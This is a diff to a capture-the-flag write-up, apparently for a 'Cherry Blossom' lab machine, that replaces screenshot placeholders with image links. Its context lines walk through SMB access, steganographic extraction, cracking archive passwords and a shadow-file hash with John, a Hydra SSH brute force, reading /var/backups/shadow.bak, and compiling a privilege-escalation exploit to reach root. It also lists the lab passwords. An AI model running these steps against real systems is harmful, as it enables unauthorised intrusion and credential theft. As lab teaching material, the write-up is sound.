@@ -16,7 +16,7 @@ _https://github.com/DominicBreuker/stego-toolkit_
 nmap IP
 ```
 
-[SCREEN01]
+![SCREEN01](https://github.com/user-attachments/assets/c322b55a-e855-428c-9d12-3663e541b038)
 
 2. The scan reveals an SMB service is running. Examine and access it
 
@@ -34,7 +34,7 @@ ls
 get journal.txt
 ```
 
-[SCREEN02]
+![SCREEN02](https://github.com/user-attachments/assets/6d414add-e57b-4c57-ae60-fb1d8deae3c9)
 
 3. The `journal.txt` file is base64 encoded. Decode it to reveal its true content
 
@@ -56,7 +56,7 @@ stegpy journal
 hexedit _journal.zip
 ```
 
-[SCREEN03]
+![SCREEN03](https://github.com/user-attachments/assets/10eae49e-1ed6-4e8c-952a-99477edd76c1)
 
 6. The `.zip` file is password protected. Use John the Ripper to crack it
    - The password is **september**
@@ -67,7 +67,7 @@ john hash.txt
 unzip _journal.zip
 ```
 
-[SCREEN04]
+![SCREEN04](https://github.com/user-attachments/assets/bb14c848-8e5d-4809-bfde-6074d107fc75)
 
 7. Inside the ZIP is a file named `Journal.ctz` which is a 7z archive, also password protected
    - The password is **tigerlily**
@@ -88,13 +88,13 @@ apt-get install liblzma-dev
 cpan install Compress::Raw::Lzma
 ```
 
-[SCREEN05]
+![SCREEN05](https://github.com/user-attachments/assets/7106f491-f4b0-4b42-b375-706365c31d4d)
 
 8. The extracted contents include a diary with the first flag and important information
    - Usernames: **Anitta**, **Lily**, **Harry**
    - A file containing encoded passwords named: **cherry-blossom**
 
-[SCREEN06]
+![SCREEN06](https://github.com/user-attachments/assets/80235b71-ca58-45e1-9c82-216aff0972e2)
 
 ---
 
@@ -107,7 +107,7 @@ cpan install Compress::Raw::Lzma
 cat encoded | base64 -d > cherry-blossom.list
 ```
 
-[SCREEN07]
+![SCREEN07](https://github.com/user-attachments/assets/07e20b29-71da-4334-99d2-eead7d5752e5)
 
 2. Brute force SSH login using the discovered usernames and password list
    - The credentials are `lily:Mr.$un$hin3`
@@ -120,7 +120,7 @@ echo -e "lily\nanitta\nharry" > users.txt
 hydra -L users.txt -P cherry-blossom.list ssh://IP
 ```
 
-[SCREEN08]
+![SCREEN08](https://github.com/user-attachments/assets/468dd843-e7d5-4a59-bfc6-a56acbb8dba8)
 
 3. After gaining access as lily, find a backup of the shadow file with password hashes
    - Copy johan's password hash from the backup
@@ -129,7 +129,7 @@ hydra -L users.txt -P cherry-blossom.list ssh://IP
 cat /var/backups/shadow.bak
 ```
 
-[SCREEN09]
+![SCREEN09](https://github.com/user-attachments/assets/5dce60c0-8581-4526-bfef-66a24c055b07)
 
 4. Crack johan's password hash using our custom wordlist
    - The password is **##scuffleboo##**
@@ -142,7 +142,7 @@ echo '$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391
 john --format=sha512crypt --wordlist=cherry-blossom.list.txt hash.txt
 ```
 
-[SCREEN10]
+![SCREEN10](https://github.com/user-attachments/assets/c1243026-e70a-4689-91ac-d85f3256b813)
 
 5. Switch to johan's account and retrieve the user flag
 
@@ -156,7 +156,7 @@ su johan
 cat /home/johan/user.txt
 ```
 
-[SCREEN11]
+![SCREEN11](https://github.com/user-attachments/assets/07b11070-0301-4d76-8ce9-ba35713d6f9c)
 
 ---
 
@@ -176,7 +176,7 @@ gcc exploit.c -o exploit
 python -m SimpleHTTPServer
 ```
 
-[SCREEN12]
+![SCREEN12](https://github.com/user-attachments/assets/63189781-3c94-44c2-8944-bb53721027c9)
 
 ```bash
 cd /tmp
@@ -197,4 +197,4 @@ whoami
 cat /root/root.txt
 ```
 
-[SCREEN13]
+![SCREEN13](https://github.com/user-attachments/assets/d4c6a7bc-3be2-4e92-9d53-5361ef611299)
